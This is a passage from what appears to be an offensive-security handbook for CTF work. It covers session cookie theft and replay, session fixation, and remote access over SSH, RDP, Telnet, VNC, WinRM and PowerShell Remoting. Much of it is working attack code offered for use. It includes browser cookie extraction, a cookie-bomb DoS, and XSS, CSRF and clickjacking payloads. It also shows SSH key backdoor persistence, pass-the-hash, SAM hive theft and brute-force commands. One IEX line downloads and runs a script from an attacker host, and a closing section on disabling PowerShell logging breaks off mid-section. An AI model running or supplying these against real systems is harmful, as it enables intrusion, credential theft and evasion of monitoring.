curl -c cookies.txt http://target.com/login -d "user=admin&pass=pass"

# Use saved cookies
curl -b cookies.txt http://target.com/dashboard
```

**Python Cookie Manipulation**

```python
import requests

# Use session to maintain cookies
session = requests.Session()

# Set specific cookie
session.cookies.set('session', 'stolen_token')
session.cookies.set('admin', 'true')

# Make request
response = session.get('http://target.com/admin')

# Cookie jar manipulation
cookies = {'session': 'stolen_token', 'role': 'admin'}
response = requests.get('http://target.com', cookies=cookies)
```

### Browser Cookie Storage Locations

**Chrome/Chromium**

```bash
# Linux
~/.config/google-chrome/Default/Cookies

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies

# Decrypt cookies (requires master key)
python3 chrome_decrypt.py

# Extract cookies using SQLite
sqlite3 Cookies "SELECT host_key, name, value FROM cookies"
```

**Firefox**

```bash
# Linux
~/.mozilla/firefox/*.default/cookies.sqlite

# Windows
%APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite

# Extract
sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies"
```

### Cookie Replay Attacks

**Manual Cookie Replay**

```bash
# Capture valid session cookie
# Replay in different context

# Using curl
curl -H "Cookie: session=captured_token" http://target.com/admin

# Using browser console
document.cookie = "session=captured_token"
location.reload()
```

**Automated Cookie Testing**

```python
import requests

# Test stolen cookie validity
stolen_cookie = {'session': 'captured_token'}

response = requests.get('http://target.com/profile', cookies=stolen_cookie)

if response.status_code == 200 and "Welcome" in response.text:
    print("[+] Cookie is valid!")
else:
    print("[-] Cookie expired or invalid")
```

### Cookie Bomb (DoS via Cookies)

```bash
# Send excessive cookies to crash application
curl -H "Cookie: $(python3 -c 'print("a=b;" * 10000)')" http://target.com
```

---

## Session Fixation

### Concept Overview

Session fixation forces a user to authenticate with a known session ID, allowing the attacker to hijack the session after authentication without stealing credentials.

### Attack Prerequisites

- Application accepts session ID from URL/POST parameter
- Application doesn't regenerate session ID after authentication
- Attacker can set victim's session ID

### Basic Session Fixation Attack Flow

```
1. Attacker obtains valid session ID from application
2. Attacker tricks victim into using this session ID
3. Victim authenticates with fixed session ID
4. Attacker uses same session ID to access authenticated session
```

### Session Fixation via URL Parameter

**Attack Scenario**

```bash
# 1. Attacker gets session ID
curl http://target.com/login
# Response includes: Set-Cookie: PHPSESSID=attacker_session_123

# 2. Attacker crafts malicious link
http://target.com/login?PHPSESSID=attacker_session_123

# 3. Victim clicks link and logs in

# 4. Attacker uses fixed session
curl -b "PHPSESSID=attacker_session_123" http://target.com/dashboard
```

**Testing for URL-Based Session Fixation**

```bash
# Check if application accepts session ID in URL
curl "http://target.com/?PHPSESSID=test123" -v

# Check if session persists after login
curl "http://target.com/login?PHPSESSID=test123" -d "user=victim&pass=pass" -v
curl -b "PHPSESSID=test123" "http://target.com/profile" -v
```

### Session Fixation via Cookie Injection

**Using XSS for Cookie Fixation**

```javascript
// Inject session cookie via XSS
<script>
document.cookie='PHPSESSID=attacker_session_123; path=/; domain=target.com';
window.location='http://target.com/login';
</script>
```

**Using HTTP Response Splitting (if vulnerable)**

```
GET /redirect?url=http://target.com%0d%0aSet-Cookie:%20PHPSESSID=attacker_session
```

### Session Fixation via Meta Tag

```html
<!-- If attacker controls page content -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session; path=/">
```

### Hidden Form Field Session Fixation

```html
<!-- If session ID transmitted via POST -->
<form method="POST" action="http://target.com/login">
    <input type="hidden" name="session_id" value="attacker_session_123">
    <input name="username" value="victim">
    <input name="password" value="password">
</form>
<script>document.forms[0].submit();</script>
```

### Testing for Session Fixation Vulnerabilities

**Manual Testing Steps**

```bash
# 1. Obtain unauthenticated session ID
curl -i http://target.com/
# Note session ID: PHPSESSID=abc123

# 2. Force this session ID in login request
curl -b "PHPSESSID=abc123" -d "user=testuser&pass=testpass" http://target.com/login -i

# 3. Check if session ID changed after authentication
# If session ID is still abc123, application is vulnerable

# 4. Verify access with fixed session
curl -b "PHPSESSID=abc123" http://target.com/dashboard
```

**Automated Testing Script**

```python
import requests

target = "http://target.com"

# Step 1: Get initial session
session1 = requests.Session()
session1.get(target)
original_cookie = session1.cookies.get('PHPSESSID')
print(f"[*] Original session: {original_cookie}")

# Step 2: Login with fixed session
login_data = {'username': 'testuser', 'password': 'testpass'}
session1.post(f"{target}/login", data=login_data)
post_login_cookie = session1.cookies.get('PHPSESSID')
print(f"[*] Post-login session: {post_login_cookie}")

# Step 3: Check if session ID changed
if original_cookie == post_login_cookie:
    print("[!] VULNERABLE: Session ID not regenerated after login")
else:
    print("[+] SECURE: Session ID regenerated after login")
```

### Session Fixation via Cross-Subdomain Attack

```javascript
// If cookies accessible across subdomains
// From attacker-controlled subdomain: evil.target.com
<script>
document.cookie='session=fixed_session_id; domain=.target.com; path=/';
window.location='http://www.target.com/login';
</script>
```

### Session Fixation Exploitation Tools

**Burp Suite Session Fixation Testing**

```
1. Proxy > Intercept login request
2. Note session ID before authentication
3. Forward request
4. Check response for session ID regeneration
5. If unchanged, attempt to use session in new browser
```

**OWASP ZAP Session Management Testing**

```
1. Tools > Options > Active Scan > Policy
2. Enable "Session Fixation" rule
3. Run active scan on authentication endpoint
```

### Advanced Session Fixation Scenarios

**Session Fixation in Mobile Apps**

```bash
# Intercept mobile app traffic
adb shell
am start -n com.target.app/.MainActivity -e session_id "fixed_session"

# Or via proxy
mitmdump -s inject_session.py
```

**Session Fixation via DNS Rebinding**

```
1. Attacker creates DNS entry that initially resolves to attacker IP
2. Victim visits attacker.com which sets session cookie
3. DNS rebinds to target IP
4. Session cookie now sent to legitimate target with fixed session
```

### Mitigation Detection Testing

**Check for Session Regeneration**

```python
import requests

# Test session regeneration on privilege change
session = requests.Session()

# Get initial session
session.get('http://target.com/user_page')
user_session = session.cookies.get('session')

# Elevate privileges
session.post('http://target.com/upgrade_to_admin')
admin_session = session.cookies.get('session')

if user_session == admin_session:
    print("[!] Session not regenerated on privilege escalation")
```

**Test for Session ID in URL**

```bash
# Check if session accepted from URL
curl "http://target.com/;jsessionid=TEST123" -v
curl "http://target.com/?sid=TEST123" -v
curl "http://target.com/?PHPSESSID=TEST123" -v
```

### Session Fixation Combined Attacks

**Session Fixation + CSRF**

```html
<!-- Fix session then trigger CSRF -->
<img src="http://target.com/?session=fixed_id" style="display:none">
<script>
setTimeout(function(){
    document.getElementById('csrf_form').submit();
}, 1000);
</script>
<form id="csrf_form" action="http://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker_account">
</form>
```

**Session Fixation + Clickjacking**

```html
<!-- Fix session in hidden frame -->
<iframe src="http://target.com/?PHPSESSID=fixed_session" style="display:none"></iframe>

<!-- Overlay legitimate login form -->
<iframe src="http://target.com/login" style="opacity:0.00001;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>

<!-- Fake login interface -->
<div>Please login to continue...</div>
```

---

## Important Related Topics

- **Golden Ticket Attacks** for domain-wide Kerberos persistence
- **Pass-the-Hash/Pass-the-Ticket** for credential reuse without plaintext passwords
- **Kerberoasting and AS-REP Roasting** for offline credential cracking
- **JWT (JSON Web Token) attacks** for modern application authentication bypass
- **OAuth/SAML vulnerabilities** for SSO exploitation
- **Multi-Factor Authentication bypass techniques**

---

# Remote Access via Valid Credentials

## SSH Access

### SSH Fundamentals

SSH (Secure Shell) operates on TCP port 22 by default and provides encrypted remote access to systems. In CTF scenarios, you'll encounter SSH through credential discovery, key extraction, or exploitation of misconfigurations.

### Basic SSH Connection Syntax

```bash
ssh username@target_ip
ssh username@target_ip -p custom_port
ssh -i private_key username@target_ip
ssh -L local_port:remote_host:remote_port username@target_ip  # Local port forwarding
ssh -R remote_port:local_host:local_port username@target_ip  # Remote port forwarding
ssh -D local_port username@target_ip  # Dynamic port forwarding (SOCKS proxy)
```

### SSH Enumeration

```bash
# Banner grabbing
nc target_ip 22
telnet target_ip 22

# Nmap enumeration
nmap -p22 -sV target_ip
nmap -p22 --script ssh-auth-methods target_ip
nmap -p22 --script ssh-hostkey target_ip
nmap -p22 --script ssh2-enum-algos target_ip
```

### Credential-Based Access Methods

**Using discovered credentials:**

```bash
ssh user@target_ip
# Enter password when prompted

# Non-interactive password entry (avoid in production)
sshpass -p 'password' ssh user@target_ip
```

**Using private keys:**

```bash
# Standard private key authentication
ssh -i id_rsa user@target_ip

# If key has wrong permissions
chmod 600 id_rsa
ssh -i id_rsa user@target_ip

# Encrypted private key (will prompt for passphrase)
ssh -i encrypted_key user@target_ip
```

### SSH Key Formats and Conversion

```bash
# Convert PEM to OpenSSH format
ssh-keygen -p -f key.pem -m pem

# Generate public key from private key
ssh-keygen -y -f private_key > public_key.pub

# Remove passphrase from encrypted key
ssh-keygen -p -f encrypted_key
```

### SSH Configuration Files

**Client configuration** (`~/.ssh/config`):

```
Host target
    HostName target_ip
    User username
    Port 2222
    IdentityFile ~/.ssh/custom_key
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

**Server configuration** (`/etc/ssh/sshd_config` - useful for privilege escalation context):

```bash
# Review for misconfigurations
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"

# Key directives to check:
# PermitRootLogin yes
# PasswordAuthentication yes
# PubkeyAuthentication yes
# PermitEmptyPasswords yes
# AuthorizedKeysFile location
```

### SSH Tunneling for Pivoting

**Local port forwarding** (access remote service through SSH tunnel):

```bash
ssh -L 8080:internal_host:80 user@jump_host
# Access internal_host:80 via localhost:8080
```

**Remote port forwarding** (expose local service to remote network):

```bash
ssh -R 9090:localhost:80 user@remote_host
# remote_host can access your localhost:80 via its port 9090
```

**Dynamic port forwarding** (SOCKS proxy):

```bash
ssh -D 1080 user@target_ip
# Configure proxychains to use localhost:1080
```

**ProxyChains configuration** (`/etc/proxychains4.conf`):

```
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn internal_network
proxychains firefox
```

### SSH Persistence Techniques

**Authorized keys injection:**

```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f backdoor_key

# Inject public key into target
echo "your_public_key_content" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect with private key
ssh -i backdoor_key user@target_ip
```

### Common SSH Issues and Solutions

**Strict host key checking:**

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@target_ip
```

**Verbose debugging:**

```bash
ssh -v user@target_ip   # Verbose
ssh -vv user@target_ip  # More verbose
ssh -vvv user@target_ip # Maximum verbosity
```

**Agent forwarding** (use with caution):

```bash
ssh -A user@jump_host
# Your local SSH keys are available on jump_host
```

### SSH File Transfer

```bash
# SCP (Secure Copy)
scp file.txt user@target:/path/to/destination
scp user@target:/path/to/file.txt ./local_destination
scp -r directory/ user@target:/path/

# SFTP (SSH File Transfer Protocol)
sftp user@target_ip
sftp> put local_file.txt
sftp> get remote_file.txt
sftp> ls
sftp> cd /path
```

## RDP Access

### RDP Fundamentals

RDP (Remote Desktop Protocol) operates on TCP port 3389 by default and provides graphical remote access to Windows systems. RDP uses Network Level Authentication (NLA) on modern Windows systems.

### RDP Enumeration

```bash
# Nmap enumeration
nmap -p3389 -sV target_ip
nmap -p3389 --script rdp-enum-encryption target_ip
nmap -p3389 --script rdp-ntlm-info target_ip

# Check if RDP is enabled
crackmapexec smb target_ip -u username -p password -M rdp
```

### RDP Connection Tools on Kali Linux

**xfreerdp** (recommended, most feature-complete):

```bash
# Basic connection
xfreerdp /v:target_ip /u:username /p:password

# Common options
xfreerdp /v:target_ip /u:username /p:password /cert:ignore
xfreerdp /v:target_ip /u:username /p:password /size:1920x1080
xfreerdp /v:target_ip /u:username /p:password /dynamic-resolution
xfreerdp /v:target_ip /u:username /p:password +clipboard

# Domain authentication
xfreerdp /v:target_ip /u:DOMAIN\\username /p:password
xfreerdp /v:target_ip /d:DOMAIN /u:username /p:password

# Pass-the-Hash with RDP (requires Restricted Admin mode)
xfreerdp /v:target_ip /u:username /pth:NTLM_hash

# Custom port
xfreerdp /v:target_ip:3390 /u:username /p:password

# Drive redirection (file transfer)
xfreerdp /v:target_ip /u:username /p:password /drive:share,/local/path

# Multiple monitors
xfreerdp /v:target_ip /u:username /p:password /multimon
```

**rdesktop** (older, less maintained):

```bash
rdesktop target_ip
rdesktop -u username -p password target_ip
rdesktop -u username -p password -g 1920x1080 target_ip
rdesktop -u username -p password -r disk:share=/local/path target_ip
```

**remmina** (GUI tool):

```bash
remmina
# Configure connection through GUI
# Protocol: RDP
# Server: target_ip:3389
# Username/Password: credentials
```

### RDP Credential Handling

**Password authentication:**

```bash
# Interactive (prompts for password)
xfreerdp /v:target_ip /u:username

# Non-interactive
xfreerdp /v:target_ip /u:username /p:'password'

# From file (avoid in production)
xfreerdp /v:target_ip /u:username /p:$(cat password.txt)
```

**Null or empty credentials** (rare, misconfiguration):

```bash
xfreerdp /v:target_ip /u:guest /p:''
```

### RDP NLA Bypass Considerations

[Unverified] Some older RDP implementations may allow authentication bypass through NLA manipulation, but this is not a reliable technique in modern environments. Network Level Authentication should be treated as active on target systems unless enumeration confirms otherwise.

### RDP Session Hijacking After Credential Access

If you have valid administrator credentials and want to hijack existing sessions:

```cmd
# From Windows command prompt (requires SYSTEM or admin)
query user
tscon session_id /dest:console

# Or using RDP from Kali with admin creds
xfreerdp /v:target_ip /u:admin /p:password /admin
```

### RDP Port Forwarding and Pivoting

**Through SSH tunnel:**

```bash
ssh -L 3389:internal_windows_host:3389 user@jump_host
xfreerdp /v:localhost /u:username /p:password
```

**Through Metasploit portfwd:**

```
meterpreter> portfwd add -l 3389 -p 3389 -r internal_target
```

Then connect via localhost:

```bash
xfreerdp /v:127.0.0.1 /u:username /p:password
```

### RDP File Transfer Methods

**Shared drives:**

```bash
xfreerdp /v:target_ip /u:username /p:password /drive:share,/tmp
# Access via \\tsclient\share on Windows
```

**Clipboard:**

```bash
xfreerdp /v:target_ip /u:username /p:password +clipboard
# Copy-paste between systems
```

### RDP Security Considerations

**Verify encryption:**

```bash
nmap -p3389 --script rdp-enum-encryption target_ip
# Look for TLS/SSL encryption level
```

**Common RDP issues:**

```bash
# Certificate errors
xfreerdp /v:target_ip /u:username /p:password /cert:ignore

# NLA requirement (needs valid creds before connection)
# Cannot bypass without credentials or vulnerability

# Connection refused - verify port and firewall
nmap -p3389 target_ip
```

## Telnet Access

### Telnet Fundamentals

Telnet operates on TCP port 23 by default and provides unencrypted remote terminal access. All credentials and data transmitted via Telnet are cleartext, making it a security risk but occasionally present in CTF environments and legacy systems.

### Telnet Connection

```bash
# Basic connection
telnet target_ip
telnet target_ip 23

# Custom port
telnet target_ip 2323

# Non-interactive (scripted)
telnet target_ip <<EOF
username
password
commands
EOF
```

### Telnet Enumeration

```bash
# Nmap enumeration
nmap -p23 -sV target_ip
nmap -p23 --script telnet-encryption target_ip
nmap -p23 --script telnet-ntlm-info target_ip

# Banner grabbing
nc target_ip 23
echo "" | nc target_ip 23

# Check for Telnet on non-standard ports
nmap -p- --open -sV target_ip | grep telnet
```

### Credential-Based Telnet Access

**Interactive login:**

```bash
telnet target_ip
# Wait for "Login:" prompt
# Enter username
# Wait for "Password:" prompt
# Enter password
```

**Common default credentials to test** (always check specific device documentation):

```
admin:admin
root:root
admin:password
administrator:password
user:user
```

### Automated Telnet Authentication

**Using expect scripts:**

```bash
#!/usr/bin/expect
spawn telnet target_ip
expect "login:"
send "username\r"
expect "Password:"
send "password\r"
interact
```

**Using Python (pexpect):**

```python
import pexpect

child = pexpect.spawn('telnet target_ip')
child.expect('login:')
child.sendline('username')
child.expect('Password:')
child.sendline('password')
child.interact()
```

### Telnet Protocol Differences

Unlike SSH/RDP, Telnet has minimal protocol overhead:

- No encryption
- No key exchange
- No secure authentication mechanism
- Susceptible to MITM attacks
- Credentials visible in network captures

### Telnet Command Execution After Access

```bash
# Once authenticated, standard shell commands work
ls -la
cat /etc/passwd
uname -a
id
```

### Telnet Escape Sequences

```bash
# Default escape character: Ctrl+]
# Access telnet command mode
^]
telnet> ?       # Show available commands
telnet> quit    # Close connection
telnet> status  # Show connection status
```

### Telnet Traffic Capture

```bash
# Capture Telnet traffic (requires network positioning)
tcpdump -i eth0 -A -n port 23
wireshark -i eth0 -f "tcp port 23"

# Extract credentials from pcap
tcpdump -r capture.pcap -A | grep -i "login\|password"
```

### Telnet Forwarding and Pivoting

**Through SSH tunnel:**

```bash
ssh -L 2323:internal_device:23 user@jump_host
telnet localhost 2323
```

**Through proxychains:**

```bash
proxychains telnet internal_target 23
```

### Common Telnet Services and Ports

```bash
# Standard Telnet: 23
# Alternate Telnet ports: 2323, 992 (TLS)
# IoT devices: various (8023, 9000, etc.)
# Router management: 23, 2323
# ICS/SCADA: often 23 or custom ports
```

### Telnet on Specific Device Types

**Network devices (routers, switches):**

```bash
telnet router_ip
# Often drops into privileged mode
enable
# May require enable password
show running-config
```

**Linux systems:**

```bash
telnet target_ip
# Standard login prompt
# Shell access after authentication
```

**Windows systems** (rare, requires Telnet Server service):

```bash
telnet windows_target
# Microsoft Telnet Server banner
# Windows command prompt after login
```

### Telnet Debugging

```bash
# Verbose connection attempt
telnet -d target_ip

# Connection timeout (default varies)
timeout 10 telnet target_ip

# Check if port is open first
nc -zv target_ip 23
```

## VNC Access

### VNC Fundamentals

VNC (Virtual Network Computing) provides graphical remote desktop access and operates on TCP port 5900 (for display :0) by default. Each additional display increments the port number (5901 for :1, 5902 for :2, etc.). VNC has multiple implementations with varying security features.

### VNC Enumeration

```bash
# Nmap enumeration
nmap -p5900-5910 -sV target_ip
nmap -p5900 --script vnc-info target_ip
nmap -p5900 --script vnc-title target_ip

# Check for VNC on multiple ports
nmap -p5900-5920 --open target_ip

# Banner grabbing
nc target_ip 5900
echo "" | nc target_ip 5900

# Metasploit VNC scanner
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS target_ip
run
```

### VNC Versions and Authentication

**Common VNC implementations:**

- RealVNC (commercial and free versions)
- TightVNC
- TigerVNC
- UltraVNC
- x11vnc (Linux)

**VNC authentication types:**

- No authentication (dangerous misconfiguration)
- Password only (no username)
- Username + password (newer versions)
- Certificate-based (enterprise implementations)

### VNC Connection Tools on Kali Linux

**vncviewer** (TigerVNC client):

```bash
# Basic connection
vncviewer target_ip:5900
vncviewer target_ip::5900
vncviewer target_ip:0  # Display number

# With password
vncviewer target_ip:5900

# Password file (avoid in production)
vncviewer -passwd passwd.txt target_ip:5900

# View-only mode
vncviewer -viewonly target_ip:5900

# Specify quality/compression
vncviewer -quality 9 target_ip:5900
vncviewer -compresslevel 9 target_ip:5900
```

**xvnc4viewer** (older VNC client):

```bash
xvnc4viewer target_ip:5900
xvnc4viewer target_ip::5900
```

**remmina** (GUI multi-protocol client):

```bash
remmina
# Select VNC protocol
# Enter target_ip:5900
# Enter password when prompted
```

### VNC Password Authentication

**Using discovered VNC password:**

```bash
# Interactive password prompt
vncviewer target_ip:5900
# Enter password when prompted

# Non-interactive with password file
echo "password" | vncpasswd -f > vnc_passwd.txt
vncviewer -passwd vnc_passwd.txt target_ip:5900
```

**VNC password files:** VNC stores passwords in encrypted files (typically `~/.vnc/passwd`). If you gain file system access:

```bash
# Extract VNC password file
cat ~/.vnc/passwd
# Copy to local machine for decryption
```

### VNC Password Decryption

**vncpwd tool:**

```bash
# Decrypt VNC password file
git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make
./vncpwd ~/.vnc/passwd
```

**Metasploit auxiliary:**

```bash
msfconsole
use auxiliary/analyze/vnc_login
set RHOSTS target_ip
set PASSWORD discovered_password
run
```

### VNC Without Authentication

If enumeration reveals no authentication required:

```bash
# Direct connection (no password prompt)
vncviewer target_ip:5900
```

**Identify no-auth VNC with Nmap:**

```bash
nmap -p5900 --script vnc-info,realvnc-auth-bypass target_ip
# Look for "Security types: None"
```

### VNC Display Numbers and Ports

```
Display :0  = Port 5900
Display :1  = Port 5901
Display :2  = Port 5902
Display :X  = Port 5900+X
```

**Scanning multiple displays:**

```bash
for i in {0..10}; do 
    echo "Testing display :$i (port $((5900+i)))"
    nc -zv target_ip $((5900+i))
done
```

### VNC Tunneling and Pivoting

**Through SSH tunnel:**

```bash
ssh -L 5900:internal_vnc_target:5900 user@jump_host
vncviewer localhost:5900
```

**Through Metasploit:**

```
meterpreter> portfwd add -l 5900 -p 5900 -r internal_target
```

```bash
vncviewer localhost:5900
```

**Through proxychains:**

```bash
proxychains vncviewer internal_target:5900
```

### VNC Brute Force (When Authorized)

**Medusa:**

```bash
medusa -h target_ip -M vnc -P passwords.txt
medusa -h target_ip -u "" -P passwords.txt -M vnc
```

**Hydra:**

```bash
hydra -P passwords.txt vnc://target_ip:5900
```

**Metasploit:**

```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS target_ip
set PASS_FILE /path/to/wordlist.txt
run
```

### VNC Platform Differences

**Linux VNC servers:**

```bash
# x11vnc (most common)
# TigerVNC server
# Usually requires X11 display
# Port 5900+ for display numbers
```

**Windows VNC servers:**

```bash
# RealVNC
# TightVNC
# UltraVNC (Windows-specific features)
# Often port 5900 for primary desktop
```

**macOS VNC:**

```bash
# Built-in Screen Sharing (VNC-compatible)
# Default port 5900
# May require Apple-specific authentication
```

### VNC Quality and Performance Options

```bash
# Low bandwidth optimization
vncviewer -lowcolorlevel 1 -compresslevel 9 target_ip:5900

# Full quality (high bandwidth)
vncviewer -quality 9 -compresslevel 0 target_ip:5900

# Custom resolution/depth
vncviewer -depth 16 target_ip:5900
```

### VNC Security Considerations

**VNC weaknesses:**

- Default password-only authentication (no usernames)
- Weak DES-based password encryption [Unverified regarding specific implementations]
- Often no encryption in transit (plaintext)
- Maximum 8-character passwords on some implementations
- No account lockout mechanisms typically

**Secure VNC usage:**

```bash
# Always tunnel VNC through SSH
ssh -L 5900:localhost:5900 user@target_ip
vncviewer localhost:5900

# Or use VNC over TLS (if server supports)
vncviewer -SecurityTypes VeNCrypt,TLSVnc target_ip:5900
```

### VNC Connection Troubleshooting

```bash
# Connection refused
# Check if VNC service is running
nmap -p5900 target_ip

# Incorrect password
# Try common defaults: password, admin, vnc, etc.

# Protocol mismatch
# Ensure client/server version compatibility
vncviewer -version

# Firewall blocking
# Verify network connectivity
nc -zv target_ip 5900
```

### Important Subtopics

For complete CTF remote access proficiency, ensure understanding of:

- **Credential Discovery Methods**: Where/how valid credentials are typically found (previous enumeration, file shares, memory dumps, configuration files)
- **Lateral Movement**: Using initial access to discover and access additional systems
- **Privilege Escalation**: Post-access techniques specific to each protocol's typical landing privilege level
- **Traffic Analysis**: Understanding cleartext vs encrypted protocol traffic patterns for detection/extraction

---

## WinRM Access

### Protocol Overview

Windows Remote Management (WinRM) is a Windows native remote management service implementing the WS-Management protocol over HTTP/HTTPS. WinRM listens on port 5985 (HTTP) and 5986 (HTTPS) by default. The service is the foundation for PowerShell Remoting and enables remote command execution, script deployment, and system management without requiring RDP access.

### Reconnaissance and Service Detection

Identify WinRM availability using Nmap with version detection:

```bash
nmap -sV -p 5985,5986 <target>
nmap -sV -p 5985,5986 --script http-title <target>
```

For more detailed WinRM enumeration, use specialized scripts:

```bash
nmap -sV -p 5985,5986 --script winrm-http-spa-discover <target>
```

Query WinRM service status remotely using WinRM's HTTP endpoint. A successful connection returns WS-Management protocol responses identifying the service.

### Authentication Methods

WinRM supports multiple authentication schemes:

**Basic Authentication**: Transmits credentials Base64-encoded over the wire. Credentials are vulnerable to interception unless HTTPS is enforced. WinRM must be explicitly configured to accept Basic Auth.

**NTLM Authentication**: Uses NT LAN Manager challenge-response mechanism. Credentials remain on-system; only cryptographic proof is transmitted. Compatible with both HTTP and HTTPS.

**Kerberos Authentication**: Leverages Kerberos tickets for authentication. Requires domain membership and proper SPNs (Service Principal Names). Most secure for domain environments.

**CredSSP**: Delegates credentials to the remote system for additional authentication layers. Susceptible to credential theft if the remote system is compromised.

### Exploitation with Valid Credentials

#### Using Evil-WinRM

Evil-WinRM is a purpose-built Ruby tool for WinRM exploitation. Installation on Kali Linux:

```bash
sudo apt install evil-winrm
# Or via gem:
gem install evil-winrm
```

Basic connection syntax:

```bash
evil-winrm -i <target> -u <username> -p <password>
```

With domain specification:

```bash
evil-winrm -i <target> -u <domain>\<username> -p <password>
```

Using NTLM hash (pass-the-hash):

```bash
evil-winrm -i <target> -u <username> -H <ntlm_hash>
```

With Kerberos ticket (pass-the-ticket):

```bash
export KRB5CCNAME=/path/to/ticket.ccache
evil-winrm -i <target> -u <username> -r <domain> --spn HTTP/<target>
```

Once connected, Evil-WinRM provides an interactive PowerShell-like shell with native command execution. Key commands within the shell:

```powershell
# Execute Windows commands
whoami
systeminfo
Get-Process

# Upload files to target
upload /local/path/file.exe C:\temp\file.exe

# Download files from target
download C:\windows\system32\config\sam /local/destination/sam

# Execute scripts
ps> .\script.ps1

# Exit session
exit
```

#### Using Python's Pywinrm

For custom scripting or integration into exploitation frameworks:

```bash
pip install pywinrm
```

Basic Python WinRM connection:

```python
from winrm.protocol import Protocol

endpoint = r'http://<target>:5985/wsman'
username = '<username>'
password = '<password>'

p = Protocol(endpoint=endpoint, username=username, password=password, transport='basic')
shell_id = p.open_shell()
command_id = p.run_command(shell_id, 'whoami')
std_out, std_err, return_code = p.get_command_output(shell_id, command_id)
print(std_out.decode('utf-8'))
p.close_shell(shell_id)
```

For NTLM authentication:

```python
from winrm.protocol import Protocol

p = Protocol(
    endpoint=r'http://<target>:5985/wsman',
    username='<username>',
    password='<password>',
    transport='ntlm'
)
```

#### Using Impacket's Wmiexec

Impacket provides multiple WinRM and WMI-based remote execution tools:

```bash
# Install impacket
pip install impacket
```

Wmiexec leverages WMI for command execution over WinRM:

```bash
wmiexec.py '<domain>/<username>:<password>@<target>'
wmiexec.py -hashes :<ntlm_hash> '<domain>/<username>@<target>'
```

### Credential Validation and Troubleshooting

Test connectivity and authentication without Evil-WinRM:

```bash
curl -k -u <username>:<password> https://<target>:5986/wsman
```

This command validates HTTP-level connectivity and basic authentication without establishing a full WinRM session.

Check firewall rules on Windows target allowing WinRM traffic:

```powershell
# From target
netsh advfirewall firewall show rule name="Windows Remote Management*"
```

Verify WinRM service status on target:

```powershell
Get-Service winrm
Test-WSMan -ComputerName <target>
```

### Advanced WinRM Enumeration

List available WinRM endpoints and configurations:

```bash
curl -k -u <username>:<password> https://<target>:5986/wsman -v
```

Enumerate WinRM plugin configurations (requires elevated access):

```powershell
Get-PSSessionConfiguration
Get-Item -Path WSMan:\localhost\Plugin\
```

## PowerShell Remoting

### Protocol Overview and Configuration

PowerShell Remoting operates as a layer atop WinRM, providing object-oriented command execution across the network. Unlike traditional remote shells that transmit text, PowerShell Remoting serializes PowerShell objects, maintains full cmdlet functionality, and preserves output types.

PowerShell Remoting requires:

- WinRM service running on target (port 5985/5986)
- PowerShell execution policy allowing remoting
- Network connectivity to WinRM listener
- Credentials with sufficient privileges for target operations

### One-to-One and One-to-Many Remoting

#### One-to-One Remoting (Interactive Session)

Establish an interactive PowerShell session on a remote computer:

```powershell
# Basic connection
$session = New-PSSession -ComputerName <target> -Credential (Get-Credential)
Enter-PSSession -Session $session

# Alternative: Direct entry
Enter-PSSession -ComputerName <target> -Credential $cred

# Exit remoting session
Exit-PSSession
```

Within an interactive session, all standard PowerShell cmdlets execute remotely. Output returns as serialized objects.

#### One-to-Many Remoting (Command Distribution)

Execute commands on multiple computers simultaneously:

```powershell
$targets = @('<target1>', '<target2>', '<target3>')
$cred = Get-Credential

Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
    Get-Process
    Get-Service
}
```

Results are tagged with PSComputerName indicating the source target.

### Script Block Execution

Execute arbitrary PowerShell code on remote systems:

```powershell
$scriptblock = {
    Get-ChildItem -Path C:\Users -Recurse -Filter *.txt | Select-Object FullName
}

Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock $scriptblock
```

Load and execute scripts from attacker-controlled sources:

```powershell
# Download and execute in single command
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')
}
```

### Credential Handling in PowerShell Remoting

Create credential objects for use across multiple commands:

```powershell
$username = '<username>'
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}
```

Use session persistence to avoid repeated authentication:

```powershell
$session = New-PSSession -ComputerName <target> -Credential $cred

# Reuse session for multiple operations
Invoke-Command -Session $session -ScriptBlock {Get-Process}
Invoke-Command -Session $session -ScriptBlock {Get-Service}

# Close session
Remove-PSSession -Session $session
```

### File Transfer via PowerShell Remoting

Copy files from attacker to target:

```powershell
Copy-Item -Path /local/file.txt -Destination C:\temp\file.txt -ToSession $session
```

Copy files from target to attacker:

```powershell
Copy-Item -Path C:\windows\system32\config\sam -Destination /local/sam -FromSession $session
```

### Session Configuration and Persistence

List available PowerShell session configurations:

```powershell
Get-PSSessionConfiguration
```

Create custom session configuration allowing constrained execution:

```powershell
Register-PSSessionConfiguration -Name <configname> -ProcessName powershell.exe -Force
```

Configure session idle timeout and maximum memory usage:

```powershell
$params = @{
    Name = 'CustomConfig'
    ProcessName = 'powershell.exe'
    IdleTimeoutSec = 1800
    MaximumReceivedObjectSizeMB = 50
}
Register-PSSessionConfiguration @params -Force
```

### Detection Evasion via PowerShell Remoting

PowerShell Remoting logs all command execution to Windows Event Log (Event ID 4103, 4104, 4105). Log file location: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`

Disable PowerShell logging within a session (requires appropriate privileges):

```powershell
# Disable transcript logging
Stop-Transcript -ErrorAction SilentlyContinue

# Set execution policy to unrestricted
